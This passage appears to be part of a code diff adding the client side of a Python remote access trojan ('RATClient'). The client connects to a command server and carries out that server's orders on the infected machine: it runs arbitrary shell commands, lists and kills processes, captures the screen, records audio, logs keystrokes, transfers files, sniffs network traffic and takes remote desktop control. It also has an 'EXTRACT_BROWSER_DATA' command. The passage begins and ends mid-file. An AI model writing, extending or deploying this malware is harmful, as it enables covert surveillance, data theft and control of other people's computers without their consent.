+    def format_size(self, size_bytes):
+        """Convert byte size to human readable format"""
+        if size_bytes < 0:
+            return "0 B"
+            
+        units = ['B', 'KB', 'MB', 'GB', 'TB']
+        i = 0
+        while size_bytes >= 1024.0 and i < len(units) - 1:
+            size_bytes /= 1024.0
+            i += 1
+            
+        # Use more appropriate precision based on unit
+        if i == 0:  # Bytes
+            return f"{int(size_bytes)} {units[i]}"
+        elif i == 1:  # KB
+            return f"{size_bytes:.1f} {units[i]}"
+        else:  # MB and above
+            return f"{size_bytes:.2f} {units[i]}"
+    
+    def save_transfer_states(self):
+        """Save transfer states to a file for resumable transfers"""
+        try:
+            with open("client_transfer_states.json", "w") as f:
+                json.dump(self.transfer_states, f)
+            print(f"[*] Saved {len(self.transfer_states)} transfer states")
+        except Exception as e:
+            print(f"[!] Error saving transfer states: {e}")
+    
+    def load_transfer_states(self):
+        """Load transfer states from a file"""
+        try:
+            if os.path.exists("client_transfer_states.json"):
+                with open("client_transfer_states.json", "r") as f:
+                    self.transfer_states = json.load(f)
+                print(f"[*] Loaded {len(self.transfer_states)} transfer states")
+            else:
+                self.transfer_states = {}
+        except Exception as e:
+            print(f"[!] Error loading transfer states: {e}")
+            self.transfer_states = {}
+    
+    def cancel_current_transfer(self):
+        """Cancel the current transfer"""
+        self.stop_transfer = True
+        print(f"[*] Flagged current transfer for cancellation")
+    
+class ClientProcessManager:
+    """Handler for process-related operations on the client side"""
+    
+    def __init__(self, client_socket, buffer_size=4096):
+        self.client_socket = client_socket
+        self.buffer_size = buffer_size
+    
+    def handle_process_command(self, command):
+        """Process process-related commands from the server"""
+        # Convert bytes to string if necessary
+        if isinstance(command, bytes):
+            command = command.decode('utf-8')
+            
+        print(f"[*] Handling process command: {command}")
+        
+        if command == "PROCESS_LIST":
+            print("[*] Sending process list to server")
+            self.send_process_list()
+        elif command.startswith("PROCESS_DETAILS|"):
+            # Extract PID from command
+            try:
+                pid = int(command.split('|')[1])
+                self.send_process_details(pid)
+            except (IndexError, ValueError) as e:
+                print(f"[!] Error parsing process details command: {e}")
+                self.send_error("Invalid process details command")
+        elif command.startswith("KILL_PROCESS|"):
+            # Extract PID from command
+            try:
+                pid = int(command.split('|')[1])
+                self.kill_process(pid)
+            except (IndexError, ValueError) as e:
+                print(f"[!] Error parsing kill process command: {e}")
+                self.client_socket.send("ERROR: Invalid kill process command".encode())
+    
+    def send_process_list(self):
+        """Send a list of all running processes to the server"""
+        try:
+            print("[*] Gathering process list data")
+            
+            # Get system-wide CPU and memory usage
+            system_info = {
+                'cpu_percent': psutil.cpu_percent(interval=0.5),
+                'memory_percent': psutil.virtual_memory().percent,
+                'memory_used': psutil.virtual_memory().used,
+                'memory_total': psutil.virtual_memory().total
+            }
+            
+            # Get process list (first pass to initialize CPU measurement)
+            processes = []
+            
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    # First call to cpu_percent for initialization
+                    proc.cpu_percent(interval=None)
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    continue
+            
+            # Wait to get accurate CPU measurements
+            time.sleep(0.5)
+            
+            # Now collect the actual data
+            print("[*] Collecting detailed process information")
+            for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'memory_info', 'num_threads', 'create_time']):
+                try:
+                    pinfo = proc.as_dict(attrs=['pid', 'name', 'username', 'status', 'memory_info', 'num_threads', 'create_time'])
+                    
+                    # Get CPU usage
+                    try:
+                        cpu_percent = proc.cpu_percent(interval=None)
+                    except Exception as e:
+                        cpu_percent = 0
+                        print(f"[!] Error getting CPU percent: {e}")
+                    
+                    # Format data for transmission
+                    process_data = {
+                        'pid': pinfo['pid'],
+                        'name': pinfo['name'],
+                        'username': pinfo['username'] if pinfo['username'] else 'Unknown',
+                        'status': pinfo['status'],
+                        'cpu_percent': cpu_percent,
+                        'memory': pinfo['memory_info'].rss if pinfo['memory_info'] else 0,
+                        'threads': pinfo['num_threads'],
+                        'create_time': datetime.fromtimestamp(pinfo['create_time']).strftime('%Y-%m-%d %H:%M:%S') if pinfo['create_time'] else 'Unknown'
+                    }
+                    
+                    processes.append(process_data)
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
+                    # Skip this process
+                    continue
+                except Exception as e:
+                    print(f"[!] Unexpected error processing process: {e}")
+                    continue
+            
+            # Create the full response
+            response = {
+                'system': system_info,
+                'processes': processes
+            }
+            
+            # Convert to JSON and send
+            print(f"[*] Sending data for {len(processes)} processes")
+            json_data = json.dumps(response).encode('utf-8')
+            
+            # Debug: Print the first few characters of the JSON
+            print(f"[*] JSON data starts with: {json_data[:100]}...")
+            print(f"[*] Total JSON size: {len(json_data)} bytes")
+            
+            # Send size first
+            size_header = struct.pack('Q', len(json_data))
+            bytes_sent = self.client_socket.send(size_header)
+            print(f"[*] Sent size header ({bytes_sent} bytes)")
+            
+            # Add a small delay to ensure packets are properly separated
+            time.sleep(0.05)
+            
+            # Send the process list data in chunks
+            total_sent = 0
+            while total_sent < len(json_data):
+                chunk = json_data[total_sent:total_sent + self.buffer_size]
+                bytes_sent = self.client_socket.send(chunk)
+                total_sent += bytes_sent
+                
+                # If no bytes were sent, we have a connection issue
+                if bytes_sent == 0:
+                    raise RuntimeError("Socket connection broken")
+                
+                print(f"[*] Sent chunk of {bytes_sent} bytes, total sent: {total_sent}/{len(json_data)}")
+            
+            print("[*] Process list sent successfully")
+            
+        except Exception as e:
+            error_msg = f"Error getting process list: {str(e)}"
+            print(f"[!] {error_msg}")
+            self.send_error(error_msg)
+    
+    def send_process_details(self, pid):
+        """Send detailed information about a specific process"""
+        try:
+            # Check if process exists
+            if not psutil.pid_exists(pid):
+                self.send_error(f"Process with PID {pid} not found")
+                return
+            
+            # Get process info
+            proc = psutil.Process(pid)
+            
+            try:
+                # Get basic process info
+                process_info = {
+                    'pid': proc.pid,
+                    'name': proc.name(),
+                    'exe': proc.exe() if hasattr(proc, 'exe') else 'Unknown',
+                    'username': proc.username() if hasattr(proc, 'username') else 'Unknown',
+                    'status': proc.status() if hasattr(proc, 'status') else 'Unknown',
+                    'cpu_percent': proc.cpu_percent(interval=0.5),
+                    'memory': proc.memory_info().rss if hasattr(proc, 'memory_info') else 0,
+                    'threads': proc.num_threads() if hasattr(proc, 'num_threads') else 0,
+                    'create_time': datetime.fromtimestamp(proc.create_time()).strftime('%Y-%m-%d %H:%M:%S') if hasattr(proc, 'create_time') else 'Unknown'
+                }
+                
+                # Get command line
+                try:
+                    cmdline = ' '.join(proc.cmdline()) if hasattr(proc, 'cmdline') else 'Unknown'
+                    process_info['cmdline'] = cmdline
+                except (psutil.AccessDenied, psutil.ZombieProcess):
+                    process_info['cmdline'] = 'Access Denied'
+                
+                # Get network connections
+                try:
+                    if hasattr(proc, 'connections'):
+                        connections = []
+                        for conn in proc.connections():
+                            if conn.laddr and len(conn.laddr) >= 2:
+                                local = f"{conn.laddr[0]}:{conn.laddr[1]}"
+                                if conn.raddr and len(conn.raddr) >= 2:
+                                    remote = f"{conn.raddr[0]}:{conn.raddr[1]}"
+                                    connections.append(f"{local} -> {remote} ({conn.status})")
+                                else:
+                                    connections.append(f"{local} ({conn.status})")
+                        process_info['connections'] = connections
+                except (psutil.AccessDenied, psutil.ZombieProcess):
+                    process_info['connections'] = ['Access Denied']
+                
+                # Get open files
+                try:
+                    if hasattr(proc, 'open_files'):
+                        open_files = [f.path for f in proc.open_files()]
+                        process_info['open_files'] = open_files
+                except (psutil.AccessDenied, psutil.ZombieProcess):
+                    process_info['open_files'] = ['Access Denied']
+                
+                # Convert to JSON and send
+                json_data = json.dumps(process_info).encode('utf-8')
+                
+                # Send size first
+                self.client_socket.send(struct.pack('Q', len(json_data)))
+                
+                # Send the process data in chunks
+                total_sent = 0
+                while total_sent < len(json_data):
+                    chunk = json_data[total_sent:total_sent + self.buffer_size]
+                    self.client_socket.send(chunk)
+                    total_sent += len(chunk)
+                
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
+                self.send_error(f"Error accessing process {pid}: {str(e)}")
+        
+        except Exception as e:
+            self.send_error(f"Error getting process details: {str(e)}")
+    
+    def kill_process(self, pid):
+        """Terminate a process with the given PID"""
+        try:
+            # Check if process exists
+            if not psutil.pid_exists(pid):
+                self.client_socket.send(f"ERROR: Process with PID {pid} not found".encode())
+                return
+            
+            # Try to terminate the process
+            proc = psutil.Process(pid)
+            proc_name = proc.name()
+            
+            # Terminate process
+            proc.terminate()
+            
+            # Wait briefly for the process to terminate
+            gone, still_alive = psutil.wait_procs([proc], timeout=3)
+            
+            # If still alive, try to kill it
+            if still_alive:
+                proc.kill()
+                gone, still_alive = psutil.wait_procs([proc], timeout=3)
+            
+            if still_alive:
+                self.client_socket.send(f"ERROR: Could not terminate process {pid} ({proc_name})".encode())
+            else:
+                self.client_socket.send(f"SUCCESS: Process {pid} ({proc_name}) terminated".encode())
+        
+        except psutil.AccessDenied:
+            self.client_socket.send(f"ERROR: Access denied when terminating process {pid}".encode())
+        except psutil.NoSuchProcess:
+            self.client_socket.send(f"ERROR: Process with PID {pid} not found".encode())
+        except Exception as e:
+            self.client_socket.send(f"ERROR: {str(e)}".encode())
+    
+    def send_error(self, error_msg):
+        """Send an error message back to the server"""
+        try:
+            error_data = f"ERROR: {error_msg}".encode('utf-8')
+            self.client_socket.send(struct.pack('Q', len(error_data)))
+            self.client_socket.send(error_data)
+        except:
+            pass
+        
+
+
+class NetworkAnalyzer:
+    """Class for real-time analysis of network traffic"""
+    
+    def __init__(self):
+        self.active = False
+        self.analysis_thread = None
+        
+        # Initialize data structures
+        self.start_time = time.time()
+        self.total_packets = 0
+        self.total_bytes = 0
+        self.protocols = {}  # Protocol counter
+        self.connections = {}  # Connection tracking
+        
+        # For bandwidth calculation
+        self.last_update_time = time.time()
+        self.bytes_since_last = 0
+        self.packets_since_last = 0
+    
+    def start(self):
+        """Start network traffic analysis"""
+        try:
+            self.active = True
+            self.analysis_thread = threading.Thread(target=self._analyze_traffic)
+            self.analysis_thread.daemon = True
+            self.analysis_thread.start()
+            return True
+        except Exception as e:
+            print(f"[!] Error starting network analysis: {e}")
+            return False
+    
+    def stop(self):
+        """Stop network traffic analysis"""
+        self.active = False
+        if self.analysis_thread:
+            self.analysis_thread.join(timeout=1.0)
+    
+    def _analyze_traffic(self):
+        """Thread function to capture and analyze network traffic"""
+        try:
+            from scapy.all import sniff
+            
+            # Define packet handler
+            def packet_handler(packet):
+                if not self.active:
+                    return
+                
+                try:
+                    # Increment total packet count
+                    self.total_packets += 1
+                    self.packets_since_last += 1
+                    
+                    # Get packet size
+                    packet_size = len(packet)
+                    self.total_bytes += packet_size
+                    self.bytes_since_last += packet_size
+                    
+                    # Analyze protocols
+                    protocol = self._get_packet_protocol(packet)
+                    if protocol:
+                        self.protocols[protocol] = self.protocols.get(protocol, 0) + 1
+                    
+                    # Track connections
+                    connection_key = self._get_connection_key(packet)
+                    if connection_key:
+                        if connection_key not in self.connections:
+                            self.connections[connection_key] = {
+                                'bytes': 0,
+                                'packets': 0,
+                                'first_seen': time.time(),
+                                'last_seen': time.time()
+                            }
+                        
+                        self.connections[connection_key]['bytes'] += packet_size
+                        self.connections[connection_key]['packets'] += 1
+                        self.connections[connection_key]['last_seen'] = time.time()
+                    
+                except Exception as e:
+                    print(f"[!] Error processing packet: {e}")
+            
+            # Start sniffing
+            sniff(prn=packet_handler, store=False)
+        
+        except Exception as e:
+            print(f"[!] Error in network analysis thread: {e}")
+            self.active = False
+    
+    def _get_packet_protocol(self, packet):
+            """Determine the protocol of a packet"""
+            # from scapy.all import IP, TCP, UDP, ICMP, ARP
+            
+            if ARP in packet:
+                return "ARP"
+            if IP in packet:
+                if TCP in packet:
+                    # Check for application layer protocols
+                    if packet[TCP].dport == 80 or packet[TCP].sport == 80:
+                        return "HTTP"
+                    elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
+                        return "HTTPS"
+                    elif packet[TCP].dport == 22 or packet[TCP].sport == 22:
+                        return "SSH"
+                    elif packet[TCP].dport == 21 or packet[TCP].sport == 21:
+                        return "FTP"
+                    elif packet[TCP].dport == 25 or packet[TCP].sport == 25:
+                        return "SMTP"
+                    elif packet[TCP].dport == 53 or packet[TCP].sport == 53:
+                        return "DNS-TCP"
+                    else:
+                        return "TCP"
+                elif UDP in packet:
+                    if packet[UDP].dport == 53 or packet[UDP].sport == 53:
+                        return "DNS"
+                    elif packet[UDP].dport == 67 or packet[UDP].sport == 67 or \
+                        packet[UDP].dport == 68 or packet[UDP].sport == 68:
+                        return "DHCP"
+                    else:
+                        return "UDP"
+                elif ICMP in packet:
+                    return "ICMP"
+                else:
+                    return "IP"
+            
+            # Default case
+            return "Other"
+    
+    def _get_connection_key(self, packet):
+        """Generate a unique key for tracking connections"""
+        # from scapy.all import IP, TCP, UDP
+        
+        try:
+            if IP in packet:
+                src_ip = packet[IP].src
+                dst_ip = packet[IP].dst
+                
+                if TCP in packet:
+                    protocol = "TCP"
+                    sport = str(packet[TCP].sport)
+                    dport = str(packet[TCP].dport)
+                    
+                    # Normalize connection direction (client->server)
+                    if int(sport) > int(dport):
+                        return f"{dst_ip}|{src_ip}|{protocol}|{dport}"
+                    else:
+                        return f"{src_ip}|{dst_ip}|{protocol}|{dport}"
+                        
+                elif UDP in packet:
+                    protocol = "UDP"
+                    sport = str(packet[UDP].sport)
+                    dport = str(packet[UDP].dport)
+                    
+                    # Normalize connection direction
+                    if int(sport) > int(dport):
+                        return f"{dst_ip}|{src_ip}|{protocol}|{dport}"
+                    else:
+                        return f"{src_ip}|{dst_ip}|{protocol}|{dport}"
+                else:
+                    # Other IP-based protocol
+                    protocol = str(packet[IP].proto)
+                    return f"{src_ip}|{dst_ip}|{protocol}|0"
+        except Exception as e:
+            print(f"[!] Error generating connection key: {e}")
+        
+        return None
+    
+    def get_analysis_data(self):
+        """Get the current analysis data"""
+        # Calculate time difference since last update
+        current_time = time.time()
+        time_diff = max(0.001, current_time - self.last_update_time)  # Avoid division by zero
+        
+        # Prepare data to send
+        analysis_data = {
+            'total_packets': self.total_packets,
+            'total_bytes': self.total_bytes,
+            'protocols': self.protocols,
+            'connections': self.connections,
+            'bytes_since_last': self.bytes_since_last,
+            'packets_since_last': self.packets_since_last,
+            'time_diff': time_diff
+        }
+        
+        # Reset counters for next update
+        self.bytes_since_last = 0
+        self.packets_since_last = 0
+        self.last_update_time = current_time
+        
+        return analysis_data
+    
+    def identify_anomalies(self):
+        """Identify potential anomalous network behavior"""
+        anomalies = []
+        
+        # Check for unusually high traffic from a single connection
+        if self.connections:
+            avg_bytes = sum(conn['bytes'] for conn in self.connections.values()) / len(self.connections)
+            threshold = avg_bytes * 5  # 5x average is suspicious
+            
+            for conn_key, conn_data in self.connections.items():
+                if conn_data['bytes'] > threshold:
+                    parts = conn_key.split('|')
+                    if len(parts) >= 4:
+                        source, destination, protocol, port = parts
+                        anomalies.append({
+                            'type': 'high_traffic',
+                            'connection': conn_key,
+                            'source': source,
+                            'destination': destination,
+                            'protocol': protocol,
+                            'port': port,
+                            'bytes': conn_data['bytes'],
+                            'threshold': threshold
+                        })
+        
+        # Check for port scanning (many connections with few packets each)
+        port_scan_candidates = {}
+        for conn_key, conn_data in self.connections.items():
+            parts = conn_key.split('|')
+            if len(parts) >= 4:
+                source, destination, protocol, port = parts
+                
+                if protocol == "TCP" and conn_data['packets'] < 5:
+                    key = f"{source}|{destination}"
+                    if key not in port_scan_candidates:
+                        port_scan_candidates[key] = []
+                    port_scan_candidates[key].append(int(port))
+        
+        for key, ports in port_scan_candidates.items():
+            if len(ports) > 10:  # Threshold for port scan detection
+                source, destination = key.split('|')
+                anomalies.append({
+                    'type': 'port_scan',
+                    'source': source,
+                    'destination': destination,
+                    'port_count': len(ports),
+                    'ports': ports[:20]  # First 20 ports for context
+                })
+        
+        return anomalies
+
+    def get_frequent_connections(self, limit=10):
+        """Get the most frequently accessed destinations"""
+        destination_counts = {}
+        
+        for conn_key, conn_data in self.connections.items():
+            parts = conn_key.split('|')
+            if len(parts) >= 4:
+                destination = parts[1]  # Destination IP
+                
+                if destination not in destination_counts:
+                    destination_counts[destination] = {
+                        'packets': 0,
+                        'bytes': 0,
+                        'connections': 0
+                    }
+                
+                destination_counts[destination]['packets'] += conn_data['packets']
+                destination_counts[destination]['bytes'] += conn_data['bytes']
+                destination_counts[destination]['connections'] += 1
+        
+        # Sort by bytes and return top results
+        sorted_destinations = sorted(
+            destination_counts.items(),
+            key=lambda x: x[1]['bytes'],
+            reverse=True
+        )
+        
+        return sorted_destinations[:limit]
+
+    def detect_dns_tunneling(self):
+        """Check for signs of DNS tunneling (data exfiltration over DNS)"""
+        dns_traffic = []
+        
+        for conn_key, conn_data in self.connections.items():
+            parts = conn_key.split('|')
+            if len(parts) >= 4:
+                protocol, port = parts[2], parts[3]
+                
+                if (protocol == "UDP" and port == "53") or (protocol == "TCP" and port == "53"):
+                    # This is DNS traffic
+                    dns_traffic.append((conn_key, conn_data))
+        
+        # Analyze DNS traffic patterns
+        if dns_traffic:
+            # Compute average DNS request size
+            total_bytes = sum(data[1]['bytes'] for data in dns_traffic)
+            total_packets = sum(data[1]['packets'] for data in dns_traffic)
+            avg_size = total_bytes / total_packets if total_packets > 0 else 0
+            
+            # Check if average size is suspicious (DNS tunneling often has larger than normal packets)
+            if avg_size > 100:  # Typical DNS queries are small
+                return {
+                    'suspicious': True,
+                    'avg_size': avg_size,
+                    'total_dns_traffic': total_bytes,
+                    'dns_connections': len(dns_traffic)
+                }
+        
+        return {'suspicious': False}
+    
+
+class AdaptiveScreenCapture:
+    """Handles adaptive quality and performance for screen captures"""
+    
+    def __init__(self, client_socket, initial_quality=70):
+        self.client_socket = client_socket
+        self.quality = initial_quality
+        self.min_quality = 15
+        self.max_quality = 95
+        self.target_bitrate = 5000000  # 5 Mbps target
+        self.last_adjustments = []
+        self.performance_history = []
+        self.adjustment_cooldown = 0
+    
+    def measure_performance(self, data_size, send_time):
+        """Measure and adjust based on performance metrics"""
+        if send_time > 0:
+            current_bitrate = (data_size * 8) / send_time
+            
+            # Store in history (keep last 5)
+            self.performance_history.append((data_size, send_time, current_bitrate))
+            if len(self.performance_history) > 5:
+                self.performance_history.pop(0)
+            
+            # Only adjust after collecting some data
+            if len(self.performance_history) >= 3:
+                self._adjust_quality(current_bitrate)
+    
+    def _adjust_quality(self, current_bitrate):
+        """Adjust quality based on current performance"""
+        # Skip if on cooldown
+        if self.adjustment_cooldown > 0:
+            self.adjustment_cooldown -= 1
+            return
+            
+        # Calculate average metrics
+        avg_bitrate = sum(p[2] for p in self.performance_history) / len(self.performance_history)
+        avg_send_time = sum(p[1] for p in self.performance_history) / len(self.performance_history)
+        
+        # Define adjustment parameters
+        bitrate_ratio = avg_bitrate / self.target_bitrate
+        
+        # Initial adjustment determination
+        quality_adjustment = 0
+        
+        # Bitrate is too high - reduce quality
+        if bitrate_ratio > 1.2:  # More than 20% over target
+            quality_adjustment = -5  # Reduce quality
+            
+        # Bitrate is too low - increase quality
+        elif bitrate_ratio < 0.8 and avg_send_time < 0.05:  # Less than 80% of target and fast send
+            quality_adjustment = 3  # Increase quality
+            
+        # Check for poor performance (slow sending)
+        if avg_send_time > 0.1:  # Very slow frame sending
+            quality_adjustment = -10  # Significantly reduce quality
+        
+        # Apply adjustment if needed
+        if quality_adjustment != 0:
+            new_quality = max(self.min_quality, 
+                             min(self.max_quality, self.quality + quality_adjustment))
+            
+            # Only actually change if significant
+            if abs(new_quality - self.quality) >= 3:
+                self.quality = new_quality
+                self.adjustment_cooldown = 3  # Wait 3 frames before next adjustment
+                
+                # Store adjustment for history
+                self.last_adjustments.append((self.quality, avg_bitrate, avg_send_time))
+                if len(self.last_adjustments) > 10:
+                    self.last_adjustments.pop(0)
+
+class RATClient:
+    def __init__(self, server_ip=SERVER_IP, server_port=SERVER_PORT):
+        self.server_ip = server_ip
+        self.server_port = server_port
+        self.server_address = (self.server_ip, self.server_port)
+        self.client_socket = None
+        self.connected = False
+        self.stop_threads = False
+        
+        # Flags for various features
+        self.screen_capture_active = False
+        self.audio_spy_active = False
+        self.keylogger_active = False
+        
+        # Thread trackers
+        self.active_threads = []
+        
+        # Initialize keyboard listener but don't start it yet
+        self.key_listener = None
+        self.keys_recorded = []
+        
+        # File transfer handler (will be initialized after connection)
+        self.file_handler = None
+        self.process_manager = None
+        
+        self.advanced_monitoring = None
+        
+    def connect(self):
+        """Establish connection to the server"""
+        try:
+            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.client_socket.connect(self.server_address)
+            self.connected = True
+            print(f"[*] Connected to {self.server_ip}:{self.server_port}")
+            
+            # Initialize file handler
+            self.file_handler = ClientFileHandler(self.client_socket, buffer_size=BUFFER_SIZE)
+            self.process_manager = ClientProcessManager(self.client_socket, buffer_size=BUFFER_SIZE)
+            self.advanced_monitoring = AdvancedMonitoring(self.client_socket, buffer_size=BUFFER_SIZE)
+            # Start the main command handler thread
+            self.command_thread = threading.Thread(target=self.handle_commands)
+            self.command_thread.daemon = True
+            self.command_thread.start()
+            self.active_threads.append(self.command_thread)
+            
+            return True
+        except Exception as e:
+            print(f"[!] Connection failed: {e}")
+            return False
+    
+    def reconnect(self):
+        """Attempt to reconnect to the server"""
+        while not self.connected and not self.stop_threads:
+            print("[*] Attempting to reconnect...")
+            try:
+                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.client_socket.connect(self.server_address)
+                self.connected = True
+                print(f"[*] Reconnected to {self.server_ip}:{self.server_port}")
+                
+                # Reinitialize file handler
+                self.file_handler = ClientFileHandler(self.client_socket, buffer_size=BUFFER_SIZE)
+                self.process_manager = ClientProcessManager(self.client_socket, buffer_size=BUFFER_SIZE)
+                # Restart command handler
+                self.command_thread = threading.Thread(target=self.handle_commands)
+                self.command_thread.daemon = True
+                self.command_thread.start()
+                self.active_threads.append(self.command_thread)
+                
+                break
+            except Exception as e:
+                print(f"[!] Reconnection failed: {e}")
+                time.sleep(5)  # Wait before next attempt
+    
+    def disconnect(self):
+        """Disconnect from the server and cleanup resources"""
+        self.stop_threads = True
+        self.connected = False
+        
+        # Stop all active features
+        self.screen_capture_active = False
+        self.audio_spy_active = False
+        self.stop_keylogger()
+        
+        # Close socket
+        if self.client_socket:
+            try:
+                self.client_socket.close()
+            except:
+                pass
+            self.client_socket = None
+        
+        print("[*] Disconnected from server")
+    
+    def handle_commands(self):
+        """Main loop for handling server commands"""
+        while self.connected and not self.stop_threads:
+            try:
+                # Wait for commands from the server
+                data = self.client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
+                print(data)
+                if not data:
+                    # Connection lost
+                    print("[!] Connection to server lost")
+                    self.connected = False
+                    self.reconnect()
+                    break
+                
+                # Process different command types
+                if data == 'GETHOSTNAME':
+                    self.send_hostname()
+                
+                elif data.startswith('CMD_COMMAND_'):
+                    # Execute shell command
+                    command = data[12:]  # Remove prefix
+                    self.execute_command(command)
+                
+                elif data == 'SCRSHOOT':
+                    # Start screen capture
+                    if not self.screen_capture_active:
+                        self.screen_capture_active = True
+                        screen_thread = threading.Thread(target=self.screen_capture)
+                        screen_thread.daemon = True
+                        screen_thread.start()
+                        self.active_threads.append(screen_thread)
+                
+                elif data == 'STOP_SCRSHOOT':
+                    # Stop screen capture
+                    self.screen_capture_active = False
+                
+                elif data == 'AUDIO_SPY':
+                    # Start audio spy
+                    if not self.audio_spy_active:
+                        self.audio_spy_active = True
+                        audio_thread = threading.Thread(target=self.audio_spy)
+                        audio_thread.daemon = True
+                        audio_thread.start()
+                        self.active_threads.append(audio_thread)
+                
+                elif data == 'CLOSE_AUDIO_SPY':
+                    # Stop audio spy
+                    self.audio_spy_active = False
+                
+                elif data == 'KEY_REC':
+                    # Start keylogger
+                    self.start_keylogger()
+                
+                elif data == 'STOP_KEY_REC':
+                    # Stop keylogger
+                    self.stop_keylogger()
+                
+                # File transfer commands
+                elif data.startswith('FILE_'):
+                    print(f"[*] Handling file command: {data[:20]}...")
+                    if self.file_handler:
+                        self.file_handler.handle_file_command(data)
+                    else:
+                        print("[!] File handler not initialized")
+                
+                # Process manager commands
+                elif data == 'PROCESS_LIST' or data == b'PROCESS_LIST':
+                    print('[*] Received PROCESS_LIST command')
+                    if self.process_manager:
+                        self.process_manager.handle_process_command(data)
+                    else:
+                        print("[!] Process manager not initialized")
+
+                elif data.startswith('PROCESS_DETAILS|'):
+                    print(f'[*] Received process details command: {data}')
+                    if self.process_manager:
+                        self.process_manager.handle_process_command(data)
+                    else:
+                        print("[!] Process manager not initialized")
+
+                elif data.startswith('KILL_PROCESS|'):
+                    print(f'[*] Received kill process command: {data}')
+                    if self.process_manager:
+                        self.process_manager.handle_process_command(data)
+                    else:
+                        print("[!] Process manager not initialized")
+            
+                elif data == 'START_NETWORK_CAPTURE' or data == 'STOP_NETWORK_CAPTURE' or \
+                 data == 'GET_NETWORK_CAPTURE' or data == 'START_CLIPBOARD_MONITORING' or \
+                 data == 'STOP_CLIPBOARD_MONITORING' or data == 'GET_CLIPBOARD_DATA' or \
+                 data == 'EXTRACT_BROWSER_DATA' or data == 'START_DNS_MONITORING' or \
+                 data == 'STOP_DNS_MONITORING' or data == 'GET_DNS_HISTORY' or \
+                 data == 'GET_SYSTEM_INFO':
+                    print(f'[*] Received advanced monitoring command: {data}')
+                    if self.advanced_monitoring:
+                        self.advanced_monitoring.handle_monitoring_command(data)
+                    else:
+                        print("[!] Advanced monitoring not initialized")
+                        
+                        
+                elif data.startswith('START_REMOTE_DESKTOP'):
+                    # Format: START_REMOTE_DESKTOP|port_number
+                    parts = data.split('|')
+                    if len(parts) >= 2:
+                        try:
+                            control_port = int(parts[1])
+                            
+                            # Initialize remote desktop control if not already
+                            if not hasattr(self, 'remote_desktop'):
+                                self.remote_desktop = RemoteDesktopControl(self.client_socket)
+                            
+                            # Get screen dimensions to send back to server
+                            screen_width, screen_height = pyautogui.size()
+                            
+                            # Start the remote desktop control
+                            success = self.remote_desktop.start(control_port)
+                            
+                            if success:
+                                # Send success response with screen dimensions
+                                response = f"REMOTE_DESKTOP_STARTED|{screen_width}x{screen_height}"
+                                self.client_socket.send(response.encode())
+                            else:
+                                self.client_socket.send(b"REMOTE_DESKTOP_ERROR")
+                                
+                        except Exception as e:
+                            print(f"[!] Error starting remote desktop: {e}")
+                            self.client_socket.send(f"REMOTE_DESKTOP_ERROR|{str(e)}".encode())
+                    else:
+                        self.client_socket.send(b"REMOTE_DESKTOP_ERROR|Missing port number")
+                
+                elif data == 'STOP_REMOTE_DESKTOP':
+                    if hasattr(self, 'remote_desktop'):
+                        try:
+                            self.remote_desktop.stop()
+                            self.client_socket.send(b"REMOTE_DESKTOP_STOPPED")
+                        except Exception as e:
+                            print(f"[!] Error stopping remote desktop: {e}")
+                            self.client_socket.send(f"REMOTE_DESKTOP_ERROR|{str(e)}".encode())
+                    else:
+                        self.client_socket.send(b"REMOTE_DESKTOP_NOT_ACTIVE")
+                
+                elif data == 'START_NETWORK_ANALYSIS' or data == 'STOP_NETWORK_ANALYSIS' or \
+                 data == 'GET_NETWORK_ANALYSIS_DATA':
+                    print(f'[*] Received network analysis command: {data}')
+                    if hasattr(self, 'network_analyzer'):
+                        self.handle_network_analysis_command(data)
+                    else:
+                        print("[!] Network analyzer not initialized")
+                        self.network_analyzer = NetworkAnalyzer()
+                        self.handle_network_analysis_command(data)
+                        
+            except Exception as e:
+                print(f"[!] Error handling commands: {e}")
+                self.connected = False
+                self.reconnect()
+                break
+    
+    def send_hostname(self):
+        """Send hostname to the server"""
+        try:
+            hostname = socket.gethostname()
+            self.client_socket.send(hostname.encode())
+        except Exception as e:
+            print(f"[!] Error sending hostname: {e}")
+    
+    def execute_command(self, command):
+        """Execute a shell command and return the result"""
+        try:
+            # Determine the correct shell to use based on OS
+            if os.name == 'nt':  # Windows
+                shell = True
+            else:  # Unix/Linux/Mac
+                shell = False
+            
+            # Run the command and capture output
+            result = subprocess.run(command, shell=shell, stdout=subprocess.PIPE, 
+                                   stderr=subprocess.PIPE, text=True, timeout=10)
+            
+            # Combine stdout and stderr
+            output = result.stdout + result.stderr
+            
+            if not output:
+                output = "Command executed successfully (no output)"
+            
+            # Send back the size first (as expected by the server)
+            output_bytes = output.encode('utf-8', errors='ignore')
+            size = struct.pack('Q', len(output_bytes))
+            self.client_socket.send(size)
+            
+            # Then send the actual output
+            self.client_socket.sendall(output_bytes)
+            
+        except subprocess.TimeoutExpired:
+            error_msg = "Command timed out after 10 seconds"
+            size = struct.pack('Q', len(error_msg.encode()))
+            self.client_socket.send(size)
+            self.client_socket.send(error_msg.encode())
+        
+        except Exception as e:
+            error_msg = f"Error executing command: {e}"
+            size = struct.pack('Q', len(error_msg.encode()))
+            self.client_socket.send(size)
+            self.client_socket.send(error_msg.encode())
+    
+    def screen_capture(self):
+        """Capture screen and send to server via UDP with reliable chunking and flow control"""
+        print("[*] Starting screen capture")
+        try:
+            # Create UDP socket for sending screenshots
+            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # Set socket buffer size
+            udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)  # 8MB buffer
+            
+            # Define constants for transmission
+            MAX_CHUNK_SIZE = 4096  # Conservative chunk size to avoid fragmentation
+            PROTOCOL_OVERHEAD = 36  # Typical UDP/IP header overhead
+            EFFECTIVE_MTU = 1472  # 1500 (Ethernet MTU) - PROTOCOL_OVERHEAD
+            
+            # Ensure chunk size is within effective MTU
+            CHUNK_SIZE = min(MAX_CHUNK_SIZE, EFFECTIVE_MTU)
+            
+            # Create the adaptive capture handler
